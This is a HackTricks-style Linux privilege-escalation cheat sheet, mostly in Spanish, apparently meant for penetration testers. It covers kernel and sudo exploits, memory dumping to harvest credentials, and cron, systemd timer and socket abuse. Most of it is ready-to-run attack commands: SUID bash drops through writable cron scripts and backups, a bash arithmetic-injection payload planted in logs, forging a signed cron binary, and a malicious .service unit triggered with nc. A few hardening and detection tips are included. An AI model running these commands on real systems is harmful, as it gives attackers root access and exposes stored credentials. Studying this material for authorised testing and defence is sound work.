# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Información del Sistema

### Información del SO

Comencemos por obtener información sobre el sistema operativo que se está ejecutando
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si **tienes permisos de escritura en cualquier carpeta dentro de la variable `PATH`**, podrías ser capaz de hijack algunas libraries o binaries:
```bash
echo $PATH
```
### Información del entorno

¿Información interesante, contraseñas o claves API en las variables de entorno?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Comprueba la versión del kernel y si existe algún exploit que pueda usarse para escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puedes encontrar una buena lista de kernel vulnerables y algunos **compiled exploits** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Otros sitios donde puedes encontrar algunos **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extraer todas las versiones de kernel vulnerables de esa web puedes hacer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Herramientas que podrían ayudar a buscar kernel exploits son:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (ejecutar EN la víctima, solo comprueba exploits para kernel 2.x)

Siempre **busca la versión del kernel en Google**, puede que tu versión del kernel esté mencionada en algún kernel exploit y así podrás asegurarte de que ese exploit es válido.

Técnicas adicionales de kernel exploitation:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo versión

Basado en las versiones vulnerables de sudo que aparecen en:
```bash
searchsploit sudo
```
Puedes comprobar si la versión de sudo es vulnerable usando este grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Las versiones de sudo anteriores a 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permiten a usuarios locales sin privilegios escalar sus privilegios a root a través de la opción sudo `--chroot` cuando el archivo `/etc/nsswitch.conf` se usa desde un directorio controlado por el usuario.

Aquí tienes un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para exploit esa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de ejecutar el exploit, asegúrate de que tu versión de `sudo` sea vulnerable y de que soporte la función `chroot`.

Para más información, consulta el original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Consulta **smasher2 box of HTB** para un **ejemplo** de cómo se podría explotar esta vuln.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Más enumeración del sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar posibles defensas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si estás dentro de un container, comienza con la siguiente sección container-security y luego pivot hacia las páginas de abuso específicas del runtime:


{{#ref}}
container-security/
{{#endref}}

## Unidades

Revisa **qué está montado y qué está desmontado**, dónde y por qué. Si algo está desmontado, podrías intentar montarlo y comprobar si contiene información privada
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binarios útiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Además, comprueba si **hay algún compilador instalado**. Esto es útil si necesitas usar algún kernel exploit, ya que se recomienda compilarlo en la máquina donde lo vas a usar (o en una similar)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerable instalado

Comprueba la **versión de los paquetes y servicios instalados**. Puede que haya alguna versión antigua de Nagios (por ejemplo) que podría explotarse para escalating privileges…\
Se recomienda comprobar manualmente la versión del software instalado que parezca más sospechoso.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si tienes acceso SSH a la máquina, también podrías usar **openVAS** para comprobar si hay software instalado en la máquina que esté desactualizado o vulnerable.

> [!NOTE] > _Ten en cuenta que estos comandos mostrarán mucha información que en su mayoría será inútil; por lo tanto, se recomienda usar aplicaciones como OpenVAS o similares que verifiquen si alguna versión de software instalada es vulnerable a exploits conocidos_

## Procesos

Echa un vistazo a **qué procesos** se están ejecutando y comprueba si algún proceso tiene **más privilegios de los que debería** (¿quizá un tomcat que se está ejecutando como root?)
```bash
ps aux
ps -ef
top -n 1
```
Siempre comprueba si hay [**electron/cef/chromium debuggers** en ejecución, podrías abusar de ello para escalar privilegios](electron-cef-chromium-debugger-abuse.md). **Linpeas** los detecta comprobando el parámetro `--inspect` dentro de la línea de comandos del proceso.\  
También **comprueba tus privilegios sobre los binarios de los procesos**, quizá puedas sobrescribir alguno.

### Cadenas padre-hijo entre distintos usuarios

Un proceso hijo que se ejecute con un **usuario distinto** al de su padre no es automáticamente malicioso, pero es una **señal útil de triage**. Algunas transiciones son esperadas (`root` que lanza un usuario de servicio, los gestores de inicio de sesión que crean procesos de sesión), pero cadenas inusuales pueden revelar envoltorios, ayudantes de depuración, persistencia o límites de confianza débiles en tiempo de ejecución.

Revisión rápida:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Si encuentras una cadena inesperada, inspecciona la línea de comandos del parent y todos los archivos que influyen en su comportamiento (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments). En varios privesc paths reales el child en sí no era escribible, pero la **parent-controlled config** o el helper chain sí lo era.

### Ejecutables eliminados y archivos abiertos eliminados

Los artefactos en tiempo de ejecución a menudo siguen siendo accesibles **tras la eliminación**. Esto es útil tanto para privilege escalation como para recuperar evidencia de un proceso que ya tiene archivos sensibles abiertos.

Busca ejecutables eliminados:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Si `/proc/<PID>/exe` apunta a `(deleted)`, el proceso sigue ejecutando la imagen binaria antigua desde la memoria. Esto es una fuerte señal para investigar porque:

- el ejecutable eliminado puede contener strings interesantes o credenciales
- el proceso en ejecución aún puede exponer descriptores de archivo útiles
- un binario privilegiado eliminado puede indicar manipulación reciente o intento de limpieza

Recopilar archivos abiertos eliminados globalmente:
```bash
lsof +L1
```
Si encuentras un descriptor interesante, recupéralo directamente:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Esto es especialmente valioso cuando un proceso todavía tiene abierto un secreto eliminado, un script, una exportación de base de datos o un archivo flag.

### Monitorización de procesos

Puedes usar herramientas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorizar procesos. Esto puede ser muy útil para identificar procesos vulnerables que se ejecutan con frecuencia o cuando se cumplen un conjunto de requisitos.

### Memoria de procesos

Algunos servicios de un servidor guardan **credenciales en texto claro dentro de la memoria**.\
Normalmente necesitarás **privilegios de root** para leer la memoria de procesos que pertenecen a otros usuarios; por lo tanto, esto suele ser más útil cuando ya eres root y quieres descubrir más credenciales.\
Sin embargo, recuerda que **como usuario normal puedes leer la memoria de los procesos que posees**.

> [!WARNING]
> Ten en cuenta que hoy en día la mayoría de las máquinas **no permiten ptrace por defecto**, lo que significa que no puedes volcar otros procesos que pertenezcan a tu usuario sin privilegios.
>
> El archivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla la accesibilidad de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos los procesos pueden ser depurados, siempre que tengan el mismo uid. Esta es la forma clásica en que funcionaba ptracing.
> - **kernel.yama.ptrace_scope = 1**: solo un proceso padre puede ser depurado.
> - **kernel.yama.ptrace_scope = 2**: solo el administrador puede usar ptrace, ya que requiere la capacidad CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: no se puede trazar ningún proceso con ptrace. Una vez establecido, se necesita reiniciar para habilitar ptracing de nuevo.

#### GDB

Si tienes acceso a la memoria de un servicio FTP (por ejemplo) podrías obtener el Heap y buscar en su interior las credenciales.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script de GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Para un ID de proceso dado, **maps muestran cómo se asigna la memoria dentro del espacio de direcciones virtuales de ese proceso**; además muestran los **permisos de cada región mapeada**. El pseudo file **mem** **expone la propia memoria del proceso**. A partir del archivo **maps** sabemos qué **regiones de memoria son legibles** y sus desplazamientos. Usamos esta información para **seek into the mem file and dump all readable regions** en un archivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` proporciona acceso a la memoria **física** del sistema, no a la memoria virtual. El espacio de direcciones virtuales del kernel puede ser accedido usando /dev/kmem.\
Típicamente, `/dev/mem` solo es legible por **root** y el grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para linux

ProcDump es una reinterpretación para Linux de la clásica herramienta ProcDump de la suite Sysinternals para Windows. Descárgalo en [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Herramientas

Para volcar la memoria de un proceso puedes usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que te pertenece
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (se requiere root)

### Credenciales en la memoria del proceso

#### Ejemplo manual

Si encuentras que el proceso authenticator está en ejecución:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puedes dump el proceso (ver secciones anteriores para encontrar diferentes maneras de dump the memory of a process) y buscar credentials inside the memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **robará credenciales en texto claro de la memoria** y de algunos **archivos bien conocidos**. Requiere privilegios de root para funcionar correctamente.

| Característica                                    | Nombre del proceso   |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Expresiones regulares de búsqueda/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tareas programadas/Cron jobs

### Crontab UI (alseambusher) ejecutándose como root – programador web privesc

Si un panel web “Crontab UI” (alseambusher/crontab-ui) se ejecuta como root y está enlazado solo a loopback, aún puedes acceder a él mediante un reenvío de puertos local SSH y crear una tarea privilegiada para escalar privilegios.

Cadena típica
- Descubrir puerto accesible solo desde loopback (p. ej., 127.0.0.1:8000) y el realm de Basic-Auth vía `ss -ntlp` / `curl -v localhost:8000`
- Encontrar credenciales en artefactos operativos:
- Copias de seguridad/scripts con `zip -P <password>`
- Unidad systemd que expone `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crear un túnel e iniciar sesión:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crear un job con privilegios elevados y ejecutarlo inmediatamente (genera SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Úsalo:
```bash
/tmp/rootshell -p   # root shell
```
Endurecimiento
- No ejecutar Crontab UI como root; restringirlo a un usuario dedicado con permisos mínimos
- Enlazar a localhost y, además, restringir el acceso mediante firewall/VPN; no reutilizar contraseñas
- Evitar incrustar secretos en unit files; usar secret stores o EnvironmentFile solo accesible por root
- Habilitar audit/logging para ejecuciones de jobs on-demand

Comprueba si algún scheduled job es vulnerable. Quizá puedas aprovechar un script ejecutado por root (wildcard vuln? ¿puedes modificar archivos que root usa? ¿usar symlinks? ¿crear archivos específicos en el directorio que root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Si se utiliza `run-parts`, comprueba qué nombres se ejecutarán realmente:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Esto evita falsos positivos. Un directorio periódico escribible solo es útil si el nombre de archivo de tu payload coincide con las reglas locales de `run-parts`.

### Ruta de Cron

Por ejemplo, dentro de _/etc/crontab_ puedes encontrar el PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota cómo el usuario "user" tiene privilegios de escritura sobre /home/user_)

Si dentro de este crontab el usuario root intenta ejecutar algún comando o script sin establecer el PATH. Por ejemplo: _\* \* \* \* root overwrite.sh_\
Entonces, puedes obtener una shell root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando un script con un wildcard (Wildcard Injection)

Si un script se ejecuta como root y contiene un “**\***” dentro de un comando, podrías explotarlo para provocar comportamientos inesperados (como privesc). Ejemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si el wildcard está precedido por una ruta como** _**/some/path/\***_ **, no es vulnerable (incluso** _**./\***_ **no lo es).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si el script ejecutado por root usa un **directory donde tienes acceso completo**, quizá sea útil eliminar esa carpeta y **crear una carpeta symlink hacia otra** que sirva un script controlado por ti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validación de symlinks y manejo de archivos más seguro

Al revisar scripts/binaries privilegiados que leen o escriben archivos por ruta, verifica cómo se manejan los enlaces:

- `stat()` sigue un symlink y devuelve los metadatos del objetivo.
- `lstat()` devuelve los metadatos del enlace en sí.
- `readlink -f` y `namei -l` ayudan a resolver el objetivo final y muestran los permisos de cada componente de la ruta.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Para defenders/developers, patrones más seguros contra symlink tricks incluyen:

- `O_EXCL` con `O_CREAT`: fail if the path already exists (blocks attacker pre-created links/files).
- `openat()`: operate relative to a trusted directory file descriptor.
- `mkstemp()`: create temporary files atomically with secure permissions.

### Custom-signed cron binaries with writable payloads
Los blue teams a veces "sign" binarios impulsados por cron volcando una sección ELF personalizada y haciendo grep de una vendor string antes de ejecutarlos como root. Si ese binario es escribible por el grupo (por ejemplo, `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) y puedes leak el signing material, puedes forgear la sección y secuestrar la tarea de cron:

1. Usa `pspy` para capturar el flujo de verificación. En Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.

### Frequent cron jobs

Puedes monitorizar los procesos para buscar procesos que se están ejecutando cada 1, 2 o 5 minutos. Quizá puedas aprovecharlo y escalar privilegios.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**También puedes usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (esto monitorizará y listará cada proceso que se inicie).

### Backups de root que preservan los bits de modo establecidos por el atacante (pg_basebackup)

Si un cron propiedad de root envuelve `pg_basebackup` (o cualquier copia recursiva) contra un directorio de base de datos en el que puedas escribir, puedes plantar un **SUID/SGID binary** que será recopiado como **root:root** con los mismos bits de modo en la salida del backup.

Flujo típico de descubrimiento (como un usuario DB con bajos privilegios):
- Usa `pspy` para detectar un cron de root que ejecute algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` cada minuto.
- Confirma que el cluster fuente (p. ej., `/var/lib/postgresql/14/main`) es escribible por ti y que el destino (`/opt/backups/current`) pasa a ser propiedad de root después del trabajo.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Esto funciona porque `pg_basebackup` preserva los bits de modo de archivo al copiar el cluster; cuando se invoca como root los archivos de destino heredan **root ownership + attacker-chosen SUID/SGID**. Cualquier rutina privilegiada de backup/copy que conserve los permisos y escriba en una ubicación ejecutable es vulnerable.

### Tareas cron invisibles

Es posible crear una tarea cron **colocando un retorno de carro después de un comentario** (sin carácter de nueva línea), y la tarea cron funcionará. Ejemplo (fíjate en el carácter de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Para detectar este tipo de entrada sigilosa, inspeccione los archivos de cron con herramientas que muestren caracteres de control:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Servicios

### Archivos _.service_ escribibles

Comprueba si puedes escribir cualquier archivo `.service`, si puedes, **podrías modificarlo** para que **ejecute** tu **backdoor cuando** el servicio sea **iniciado**, **reiniciado** o **detenido** (quizá necesites esperar hasta que la máquina se reinicie).\
Por ejemplo crea tu backdoor dentro del archivo .service con **`ExecStart=/tmp/script.sh`**

### Binarios de servicio escribibles

Ten en cuenta que si tienes **permisos de escritura sobre binarios que son ejecutados por servicios**, puedes modificarlos para incluir backdoors de modo que cuando los servicios se re-ejecuten, las backdoors se ejecuten.

### systemd PATH - Rutas relativas

Puedes ver el PATH usado por **systemd** con:
```bash
systemctl show-environment
```
Si encuentras que puedes **write** en cualquiera de las carpetas de la ruta, puede que seas capaz de **escalate privileges**. Debes buscar **rutas relativas usadas en archivos de configuración de servicios** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Luego, crea un **ejecutable** con el **mismo nombre que el binario referenciado por una ruta relativa** dentro de la carpeta del PATH de systemd en la que tengas permisos de escritura, y cuando al servicio se le solicite ejecutar la acción vulnerable (**Start**, **Stop**, **Reload**), tu **backdoor se ejecutará** (los usuarios sin privilegios normalmente no pueden iniciar/detener servicios, pero comprueba si puedes usar `sudo -l`).

**Aprende más sobre los servicios con `man systemd.service`.**

## **Temporizadores**

Los temporizadores son archivos de unidad de systemd cuyo nombre termina en `**.timer**` que controlan archivos `**.service**` o eventos. Los temporizadores pueden usarse como alternativa a cron, ya que tienen soporte integrado para eventos de tiempo de calendario y eventos de tiempo monotónico, y pueden ejecutarse de forma asíncrona.

Puedes enumerar todos los temporizadores con:
```bash
systemctl list-timers --all
```
### Temporizadores modificables

Si puedes modificar un temporizador, puedes hacer que ejecute algunas unidades existentes de systemd.unit (como una `.service` o una `.target`)
```bash
Unit=backdoor.service
```
En la documentación puedes leer qué es la Unit:

> La unit que se activa cuando expire este timer. El argumento es un nombre de unit, cuyo sufijo no es ".timer". Si no se especifica, este valor por defecto es un service que tiene el mismo nombre que el timer unit, excepto por el sufijo. (Ver arriba.) Se recomienda que el nombre de unit que se activa y el nombre de unit del timer unit se llamen idénticamente, excepto por el sufijo.

Por lo tanto, para abusar de este permiso necesitarías:

- Encontrar alguna systemd unit (como un `.service`) que esté **ejecutando un binario escribible**
- Encontrar alguna systemd unit que esté **ejecutando una ruta relativa** y sobre la cual tengas **privilegios de escritura** en el **systemd PATH** (para suplantar ese ejecutable)

**Aprende más sobre timers con `man systemd.timer`.**

### **Habilitar Timer**

Para habilitar un timer necesitas privilegios de root y ejecutar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

Another high-impact misconfiguration is:

- a socket unit with `Accept=no` and `Service=<name>.service`
- the referenced service unit is missing
- an attacker can write into `/etc/systemd/system` (or another unit search path)

In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets escribibles

